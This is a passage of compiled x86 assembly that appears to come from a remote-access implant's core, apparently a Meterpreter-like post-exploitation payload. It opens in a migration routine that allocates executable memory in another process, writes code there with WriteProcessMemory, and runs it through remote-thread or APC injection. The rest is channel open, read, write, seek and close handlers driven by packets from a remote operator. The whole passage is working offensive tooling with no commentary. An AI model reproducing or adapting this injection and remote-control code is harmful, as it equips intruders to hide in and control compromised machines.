	movl	%eax, -12(%ebp)
	jmp	L91
L90:
	leal	-56(%ebp), %eax
	movl	%eax, 4(%esp)
	leal	-60(%ebp), %eax
	movl	%eax, (%esp)
	call	_get_migrate_context
	movl	%eax, -12(%ebp)
L91:
	cmpl	$0, -12(%ebp)
	jne	L108
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	$1, 4(%esp)
	movl	$0, (%esp)
	movl	__imp__CreateEventA@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L93
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L101
L93:
	movl	-56(%ebp), %eax
	movl	%eax, %ebx
	movl	__imp__GetCurrentProcess@0, %eax
	call	*%eax
	movl	$2, 24(%esp)
	movl	$1, 20(%esp)
	movl	$0, 16(%esp)
	movl	%ebx, 12(%esp)
	movl	-16(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-20(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__DuplicateHandle@28, %eax
	call	*%eax
	subl	$28, %esp
	testl	%eax, %eax
	jne	L94
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L101
L94:
	movl	-64(%ebp), %edx
	movl	-60(%ebp), %eax
	addl	%eax, %edx
	movl	-68(%ebp), %eax
	addl	%eax, %edx
	movl	-76(%ebp), %eax
	addl	%edx, %eax
	movl	$64, 16(%esp)
	movl	$12288, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualAllocEx@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	%eax, -36(%ebp)
	cmpl	$0, -36(%ebp)
	jne	L95
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L101
L95:
	movl	-64(%ebp), %edx
	movl	-60(%ebp), %eax
	leal	(%edx,%eax), %ecx
	movl	-56(%ebp), %eax
	movl	-36(%ebp), %edx
	addl	%ecx, %edx
	movl	%edx, 8(%eax)
	movl	-64(%ebp), %eax
	movl	$0, 16(%esp)
	movl	%eax, 12(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L96
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L101
L96:
	movl	-60(%ebp), %edx
	movl	-56(%ebp), %eax
	movl	-64(%ebp), %ebx
	movl	-36(%ebp), %ecx
	addl	%ebx, %ecx
	movl	$0, 16(%esp)
	movl	%edx, 12(%esp)
	movl	%eax, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L97
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L101
L97:
	movl	-68(%ebp), %edx
	movl	-56(%ebp), %eax
	movl	8(%eax), %eax
	movl	$0, 16(%esp)
	movl	%edx, 12(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L98
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L101
L98:
	movl	-76(%ebp), %edx
	movl	-72(%ebp), %eax
	movl	-56(%ebp), %ecx
	movl	8(%ecx), %ebx
	movl	-68(%ebp), %ecx
	addl	%ebx, %ecx
	movl	$0, 16(%esp)
	movl	%edx, 12(%esp)
	movl	%eax, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L99
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L101
L99:
	movl	-56(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-64(%ebp), %edx
	movl	-36(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, 20(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	-48(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_inject_via_remotethread
	testl	%eax, %eax
	je	L100
	movl	-64(%ebp), %edx
	movl	-36(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, 24(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, 20(%esp)
	movl	-48(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	-44(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_inject_via_apcthread
	testl	%eax, %eax
	je	L100
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L101
L100:
	movl	$0, -12(%ebp)
	jmp	L101
L108:
	nop
L101:
	movl	-72(%ebp), %eax
	testl	%eax, %eax
	je	L102
	movl	-72(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, -72(%ebp)
L102:
	cmpl	$0, -12(%ebp)
	je	L103
	cmpl	$0, -24(%ebp)
	je	L103
	movl	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
L103:
	cmpl	$0, -16(%ebp)
	je	L104
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L104:
	cmpl	$0, -20(%ebp)
	je	L105
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L105:
	cmpl	$0, 16(%ebp)
	je	L106
	movl	16(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, (%eax)
L106:
	cmpl	$0, -12(%ebp)
	setne	%al
	movzbl	%al, %eax
	movl	-4(%ebp), %ebx
	leave
	ret
	.globl	_remote_request_core_transport_set_timeouts
	.def	_remote_request_core_transport_set_timeouts;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_set_timeouts:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$52, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L110
	movl	$8, -12(%ebp)
	jmp	L111
L110:
	movl	$131506, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -20(%ebp)
	movl	$131505, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -24(%ebp)
	movl	$131511, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -28(%ebp)
	movl	$131512, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -32(%ebp)
	cmpl	$0, -20(%ebp)
	je	L112
	movl	8(%ebp), %eax
	movl	-20(%ebp), %edx
	movl	%edx, 68(%eax)
	call	_current_unix_timestamp
	movl	-20(%ebp), %edx
	addl	%eax, %edx
	movl	8(%ebp), %eax
	movl	%edx, 72(%eax)
L112:
	cmpl	$0, -24(%ebp)
	je	L113
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 52(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %ebx
	call	_current_unix_timestamp
	movl	%eax, 64(%ebx)
L113:
	cmpl	$0, -28(%ebp)
	je	L114
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	-28(%ebp), %edx
	movl	%edx, 56(%eax)
L114:
	cmpl	$0, -32(%ebp)
	je	L115
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	-32(%ebp), %edx
	movl	%edx, 60(%eax)
L115:
	movl	8(%ebp), %eax
	movl	72(%eax), %ebx
	call	_current_unix_timestamp
	subl	%eax, %ebx
	movl	%ebx, %eax
	movl	%eax, 8(%esp)
	movl	$131506, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	52(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$131505, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	56(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$131511, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	60(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$131512, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
L111:
	cmpl	$0, -16(%ebp)
	je	L116
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
L116:
	movl	-12(%ebp), %eax
	addl	$52, %esp
	popl	%ebx
	popl	%ebp
	ret
	.globl	_remote_request_core_channel_open
	.def	_remote_request_core_channel_open;	.scl	2;	.type	32;	.endef
_remote_request_core_channel_open:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$65587, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_string
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	je	L119
	movl	$1168, -12(%ebp)
	jmp	L120
L119:
	movl	$131099, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -16(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	je	L121
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	call	_channel_create
	movl	%eax, -28(%ebp)
	cmpl	$0, -28(%ebp)
	jne	L122
L121:
	movl	$8, -12(%ebp)
	jmp	L120
L122:
	movl	$131126, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	-28(%ebp), %edx
	movl	%eax, 4(%edx)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_get_id
	movl	%eax, 8(%esp)
	movl	$131122, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	jne	L125
	movl	$0, 8(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit
	movl	%eax, -12(%ebp)
	jmp	L120
L125:
	nop
L120:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_response_core_channel_open
	.def	_remote_response_core_channel_open;	.scl	2;	.type	32;	.endef
_remote_response_core_channel_open:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	$131122, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L127
	movl	$8, -12(%ebp)
	jmp	L128
L127:
	movl	$0, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_create
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L128
	movl	$8, -12(%ebp)
	nop
L128:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_request_core_channel_write
	.def	_remote_request_core_channel_write;	.scl	2;	.type	32;	.endef
_remote_request_core_channel_write:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%esi
	pushl	%ebx
	subl	$80, %esp
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -20(%ebp)
	movl	$131122, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -24(%ebp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_find_by_id
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L131
	movl	$1168, -12(%ebp)
	jmp	L132
L131:
	movl	-20(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	leal	-44(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262196, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	jne	L140
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_get_class
	testl	%eax, %eax
	jne	L134
	movl	-44(%ebp), %edx
	movl	-36(%ebp), %eax
	leal	-32(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_write_to_buffered
	movl	%eax, -12(%ebp)
	jmp	L132
L134:
	movl	-20(%ebp), %eax
	addl	$24, %eax
	movl	%eax, -28(%ebp)
	movl	-28(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	je	L135
	movl	-28(%ebp), %eax
	movl	4(%eax), %eax
	movl	-44(%ebp), %ebx
	movl	-36(%ebp), %ecx
	movl	-28(%ebp), %edx
	movl	(%edx), %edx
	leal	-32(%ebp), %esi
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-20(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L132
L135:
	movl	$50, -12(%ebp)
	jmp	L132
L140:
	nop
L132:
	cmpl	$0, -20(%ebp)
	je	L137
	movl	-20(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
L137:
	cmpl	$0, -16(%ebp)
	je	L138
	movl	-32(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$131097, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$131122, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
	movl	%eax, -12(%ebp)
L138:
	movl	-12(%ebp), %eax
	addl	$80, %esp
	popl	%ebx
	popl	%esi
	popl	%ebp
	ret
	.globl	_remote_request_core_channel_read
	.def	_remote_request_core_channel_read;	.scl	2;	.type	32;	.endef
_remote_request_core_channel_read:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -28(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -24(%ebp)
	cmpl	$0, -28(%ebp)
	jne	L142
	movl	$8, -12(%ebp)
	jmp	L143
L142:
	movl	$131097, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -32(%ebp)
	movl	$131122, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_find_by_id
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	jne	L144
	movl	$1168, -12(%ebp)
	jmp	L143
L144:
	movl	-24(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L145
	movl	$8, -12(%ebp)
	jmp	L143
L145:
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_get_class
	testl	%eax, %eax
	je	L146
	cmpl	$3, %eax
	je	L147
	jmp	L159
L146:
	leal	-36(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_read_from_buffered
	movl	%eax, -12(%ebp)
	jmp	L149
L147:
	movl	-24(%ebp), %eax
	movl	40(%eax), %eax
	testl	%eax, %eax
	je	L150
	movl	-24(%ebp), %eax
	movl	40(%eax), %eax
	movl	-24(%ebp), %edx
	movl	24(%edx), %edx
	leal	-36(%ebp), %ecx
	movl	%ecx, 20(%esp)
	movl	-32(%ebp), %ecx
	movl	%ecx, 16(%esp)
	movl	-20(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-24(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L149
L150:
	movl	$50, -12(%ebp)
	jmp	L149
L159:
	movl	$50, -12(%ebp)
L149:
	cmpl	$0, -12(%ebp)
	jne	L143
	cmpl	$0, -20(%ebp)
	je	L143
	movl	-36(%ebp), %eax
	testl	%eax, %eax
	je	L143
	movl	$1, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_is_flag
	testb	%al, %al
	je	L152
	movl	$2, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_is_flag
	testb	%al, %al
	je	L153
	movl	-36(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$537133108, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_raw
	jmp	L154
L153:
	movl	-36(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262196, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_raw
L154:
	movl	$0, -12(%ebp)
	jmp	L143
L152:
	movl	-36(%ebp), %eax
	movl	$0, 24(%esp)
	movl	%eax, 20(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_write
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
L143:
	cmpl	$0, -24(%ebp)
	je	L155
	movl	-24(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
L155:
	cmpl	$0, -20(%ebp)
	je	L156
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
L156:
	cmpl	$0, -28(%ebp)
	je	L157
	movl	-36(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$131097, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$131122, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	-28(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
	movl	%eax, -12(%ebp)
L157:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_request_core_channel_close
	.def	_remote_request_core_channel_close;	.scl	2;	.type	32;	.endef
_remote_request_core_channel_close:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -20(%ebp)
	movl	$131122, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -24(%ebp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_find_by_id
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L161
	movl	$1168, -12(%ebp)
	jmp	L162
L161:
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_destroy
	cmpl	$0, -16(%ebp)
	je	L162
	movl	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$131122, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
L162:
	cmpl	$0, -16(%ebp)
	je	L163
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
	movl	%eax, -12(%ebp)
L163:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_response_core_channel_close
	.def	_remote_response_core_channel_close;	.scl	2;	.type	32;	.endef
_remote_response_core_channel_close:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$131122, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_find_by_id
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L166
	movl	$1168, -12(%ebp)
	jmp	L167
L166:
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_destroy
L167:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_request_core_channel_seek
	.def	_remote_request_core_channel_seek;	.scl	2;	.type	32;	.endef
_remote_request_core_channel_seek:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%esi
	pushl	%ebx
	subl	$48, %esp
	movl	$0, -16(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -20(%ebp)
	movl	$0, -12(%ebp)
	movl	$131122, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, (%esp)
	call	_channel_find_by_id
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L170
	movl	$1168, -12(%ebp)
	jmp	L171
L170:
	movl	-16(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_get_class
	cmpl	$3, %eax
	je	L172
	movl	$50, -12(%ebp)
	jmp	L171
L172:
	movl	-16(%ebp), %eax
	movl	48(%eax), %eax
	testl	%eax, %eax
	je	L173
	movl	-16(%ebp), %eax
	movl	48(%eax), %esi
	movl	$131142, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, %ebx
	movl	$131143, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, %edx
	movl	-16(%ebp), %eax
	movl	24(%eax), %eax
	movl	%ebx, 16(%esp)
	movl	%edx, 12(%esp)
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	*%esi
	movl	%eax, -12(%ebp)
	jmp	L171
L173:
	movl	$50, -12(%ebp)
L171:
	cmpl	$0, -16(%ebp)
	je	L174
	movl	-16(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
L174:
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
	movl	-12(%ebp), %eax
	addl	$48, %esp
	popl	%ebx
	popl	%esi
	popl	%ebp
	ret
	.globl	_remote_request_core_channel_eof
	.def	_remote_request_core_channel_eof;	.scl	2;	.type	32;	.endef
_remote_request_core_channel_eof:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -16(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -20(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -24(%ebp)
	movl	$131122, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, (%esp)
	call	_channel_find_by_id
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L177
	movl	$1168, -12(%ebp)
	jmp	L178
L177:
	movl	-16(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_get_class
	cmpl	$3, %eax
	je	L179
	movl	$50, -12(%ebp)
	jmp	L178
L179:
	movl	-16(%ebp), %eax
	movl	44(%eax), %eax
	testl	%eax, %eax
	je	L180
	movl	-16(%ebp), %eax
	movl	44(%eax), %eax
	movl	-16(%ebp), %edx
	movl	24(%edx), %edx
	leal	-24(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-16(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L178
L180:
	movl	$50, -12(%ebp)
L178:
	cmpl	$0, -16(%ebp)
	je	L181
	movl	-16(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
L181:
	movl	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$524300, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_bool
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_request_core_channel_tell
	.def	_remote_request_core_channel_tell;	.scl	2;	.type	32;	.endef
_remote_request_core_channel_tell:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -16(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -20(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -24(%ebp)
	movl	$131122, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, (%esp)
	call	_channel_find_by_id
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L184
	movl	$1168, -12(%ebp)
	jmp	L185
L184:
	movl	-16(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_channel_get_class
	cmpl	$3, %eax
	je	L186
	movl	$50, -12(%ebp)
	jmp	L185
L186:
	movl	-16(%ebp), %eax
	movl	52(%eax), %eax
	testl	%eax, %eax
	je	L187
	movl	-16(%ebp), %eax
	movl	52(%eax), %eax
	movl	-16(%ebp), %edx
	movl	24(%edx), %edx
	leal	-24(%ebp), %ecx
